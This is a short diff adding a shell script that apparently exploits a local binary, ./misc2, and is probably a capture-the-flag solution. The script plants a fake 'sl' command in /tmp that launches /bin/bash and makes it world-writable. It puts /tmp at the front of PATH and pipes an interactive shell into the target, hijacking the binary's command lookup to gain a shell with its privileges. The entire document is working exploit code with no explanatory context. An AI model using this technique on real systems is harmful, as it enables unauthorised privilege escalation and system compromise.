@@ -1,0 +1,3 @@
+echo "/bin/bash" > /tmp/sl
+chmod 777 /tmp/sl && export PATH=/tmp:$PATH
+(sh;cat) | ./misc2
